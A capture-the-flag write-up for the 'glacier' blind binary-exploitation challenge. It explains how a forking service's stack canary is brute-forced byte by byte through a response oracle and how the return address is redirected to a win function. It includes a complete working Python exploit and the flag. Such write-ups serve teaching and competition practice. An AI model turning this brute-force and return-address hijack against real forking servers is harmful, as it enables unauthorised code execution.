---
title: glacier
ctf: CryoVault Finals
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: isfcr{...}
author: ""
---

# glacier

## Summary

`glacier` is a blind binary-exploitation service: no binary or source was
provided, only `nc 0.cloud.chals.io 13368`. The service prints

```
glacier core online. depth probe ready.
depth> 
```

and for every read it answers `logged <n> samples.`, where `<n>` is exactly the
number of bytes returned by `read()` (verified with NUL bytes, 72-byte chunks and
split writes). Nothing else is exposed, so the bug had to be characterised purely
from the wire.

Sending more than 72 bytes kills the child process without a reply, and sending
exactly 72 bytes plus a single `0x00` byte survives. Varying the 73rd byte showed
that only `0x00` is accepted, i.e. a classic stack canary sits right after a
72-byte stack buffer. Extending the input one byte at a time past the canary
showed that offsets `0x50..0x57` are unused saved slots and the first byte that
must stay intact is offset `0x58` — the saved return address.

The service forks a child per connection and children inherit the parent's stack
canary, so the canary is **stable across connections** (`0x00 0x6c` was confirmed
repeatedly, and later epochs kept giving one unique byte per position). That makes
a byte-wise brute force possible with the oracle:

* canary prefix correct → the function returns, the loop prints
  `logged <n> samples.\ndepth> ` (flushed at the prompt);
* canary byte wrong → `__stack_chk_fail` aborts the child, only the banner/prompt
  that was already flushed arrives and the socket closes.

The canary rotates when the service restarts, so the recover→exploit cycle has to
fit into one epoch; with 16 parallel connections a full 8-byte canary takes about
2.5 minutes (~20 probes/s), well inside an epoch.

With the canary known the saved return address is fully controlled. The binary is
not PIE (code at `0x400000`, consistent with the sibling challenge layout), so a
blind scan of the text segment for the flag-printing function is feasible.
Probing 16-byte-aligned addresses (`0x400000..0x402000`, 512 probes) located the
win function at **`0x400570`**: returning there prints
`isfcr{bl1nd_r0p_thaws_th3_gl4c13r_c0r3_e71a93}`.

## Solution

1. **Fingerprint the read primitive.** Each line/byte burst produces
   `logged <bytes_read> samples.`. `read()` returns immediately per TCP segment,
   so `A*64` then `A*9` logs `64` then `9`, while a single 72-byte write logs
   `72`. NUL bytes are counted, so it is `read()`, not `fgets`/`scanf`.
2. **Find the frame layout.** Payload length 73 with a `0x00` at offset 72
   survives, any other byte at offset 72 kills the child → stack canary at
   `0x48`. Filling with `0x41` for `k = 9` (payload length 89) is the first length
   that dies, so the saved RIP is at `0x58` and `0x50..0x57` are dead slots.
3. **Recover the canary.** Children are forked from a common parent, so the
   canary is stable across connections; brute force it byte by byte
   (`0x00` first byte known) using "did `logged …depth> ` arrive" as the oracle.
   Supervise the service's restart (epoch) by re-validating the prefix; on
   rotation restart from byte 0.
4. **Ret2win.** Payload =
   `b"A"*72 + canary + b"\x41"*8 + p64(0x400570)`.
   `0x400570` was found by scanning the non-PIE text page at 16-byte granularity
   and looking for a response containing `isfcr{`.
5. **Validate.** The same payload was replayed on three fresh connections and
   returned the identical flag each time.

```python
#!/usr/bin/env python3
"""glacier -- blind ret2win.  See writeups/glacier/exploit.py for the full version."""
import socket, struct, time, re, threading
from concurrent.futures import ThreadPoolExecutor

HOST, PORT = "0.cloud.chals.io", 13368
PROMPT  = b"depth> "
BUF     = 72       # vulnerable stack buffer
RET_OFF = 88       # 72 buf + 8 canary + 8 dead slots
WIN     = 0x400570 # flag-printing function, found by blind text scan
WORKERS = 16

def classify(payload, wait=8.0):
    """OK = marker arrived (canary/prefix correct), NO = child died."""
    marker = b"logged %d samples.\n" % len(payload) + PROMPT
    s = None
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.settimeout(wait)
        s.sendall(payload)
    except OSError:
        return "RETRY"
    out = b""
    try:
        while time.time() - t0 < wait:
            if marker in out:
                return "OK"
            s.settimeout(max(0.05, wait - (time.time() - t0)))
            try:
                d = s.recv(65536)
            except socket.timeout:
                return "NO"
            except OSError:
                break
            if not d:
                break
            out += d
    finally:
        try: s.close()
        except Exception: pass
    return "OK" if marker in out else "NO"

def body(known, guess=None):
    p = b"A" * BUF + known
    return p + bytes([guess]) if guess is not None else p

def find_canary():
    known = b"\x00"                       # canary LSB is always 0x00
    while len(known) < 8:
        hits, lk = [], threading.Lock()
        def work(v):
            st = classify(body(known, v))
            if st == "RETRY":
                st = classify(body(known, v))
            if st == "OK":
                with lk: hits.append(v)
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            list(ex.map(work, range(256)))
        if len(hits) != 1:
            continue                      # ambiguous: rescan the byte
        known += bytes([hits[0]])
        print("canary:", known.hex(), flush=True)
    return known

canary  = find_canary()
payload = b"A" * BUF + canary + b"\x41" * (RET_OFF - BUF - 8) + struct.pack("<Q", WIN)

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
s.sendall(payload)
out, t0 = b"", time.time()
while time.time() - t0 < 8:
    try: d = s.recv(65536)
    except socket.timeout: break
    if not d: break
    out += d
    m = re.search(rb"isfcr\{[^}]*\}", out)
    if m:
        print(m.group(0).decode())
        break
s.close()
```

## Flag

```
isfcr{bl1nd_r0p_thaws_th3_gl4c13r_c0r3_e71a93}
```
